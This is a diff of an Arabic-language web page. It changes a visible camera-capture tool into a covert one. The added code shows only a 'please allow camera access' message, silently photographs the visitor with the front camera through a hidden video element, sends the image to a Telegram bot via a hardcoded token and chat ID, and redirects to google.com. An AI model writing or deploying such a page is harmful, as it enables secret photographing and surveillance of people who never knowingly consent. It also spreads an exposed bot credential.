@@ -2,47 +2,66 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <title>التقاط صورة بالكاميرا الأمامية</title>
+  <title>جارٍ السماح بالكاميرا...</title>
   <style>
-    video {
-      width: 320px;
-      height: 240px;
-      border: 1px solid black;
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: sans-serif;
+      background-color: #f0f0f0;
     }
-    #captureBtn {
-      margin-top: 10px;
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
+    h3 {
+      text-align: center;
     }
   </style>
 </head>
 <body>
-  <h3>التقاط صورة بالكاميرا الأمامية</h3>
-  <video id="video" autoplay playsinline></video><br />
-  <button id="captureBtn">التقاط صورة وإرسالها</button>
-
+  <h3>يرجى السماح بالوصول إلى الكاميرا...</h3>
+  
   <script>
     const token = '7088304249:AAF3j4m0NldOUxoLIzenuAmKZyh1RWMfDLY';
     const chatId = '6484198949';
 
-    const video = document.getElementById('video');
-    const captureBtn = document.getElementById('captureBtn');
-
-    async function startCamera() {
+    async function startCameraAndCapture() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" }
         });
+
+        // إنشاء عنصر فيديو مؤقت مخفي
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
         video.srcObject = stream;
 
-        // ننتظر حتى يبدأ الفيديو (تحسين)
-        return new Promise((resolve) => {
+        // ننتظر تشغيل الفيديو فعليًا
+        await new Promise((resolve) => {
           video.onloadedmetadata = () => {
             video.play();
             resolve();
           };
         });
+
+        // ننتظر ثانية للتأكد من بدء الكاميرا
+        await new Promise(resolve => setTimeout(resolve, 1000));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        const imageData = canvas.toDataURL('image/png');
+
+        // إيقاف الكاميرا
+        stream.getTracks().forEach(track => track.stop());
+
+        await sendPhotoToTelegram(imageData);
+
+        window.location.href = "https://google.com"; // إعادة التوجيه بعد الإرسال
+
       } catch (err) {
         alert('تعذر الوصول إلى الكاميرا: ' + err.message);
       }
@@ -59,7 +78,7 @@
         byteNumbers[i] = byteCharacters.charCodeAt(i);
       }
       const byteArray = new Uint8Array(byteNumbers);
-      const blob = new Blob([byteArray], {type: 'image/png'});
+      const blob = new Blob([byteArray], { type: 'image/png' });
       formData.append('photo', blob, 'capture.png');
 
       return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
@@ -68,31 +87,7 @@
       });
     }
 
-    captureBtn.addEventListener('click', async () => {
-      if (video.videoWidth === 0 || video.videoHeight === 0) {
-        alert('فشل التقاط الصورة: الفيديو لم يبدأ بعد.');
-        return;
-      }
-
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-      const imageData = canvas.toDataURL('image/png');
-
-      try {
-        await sendPhotoToTelegram(imageData);
-        alert('تم إرسال الصورة بنجاح.');
-      } catch (err) {
-        alert('فشل إرسال الصورة: ' + err.message);
-      }
-    });
-
-    window.onload = async () => {
-      await startCamera();
-    };
+    window.onload = startCameraAndCapture;
   </script>
 </body>
 </html>
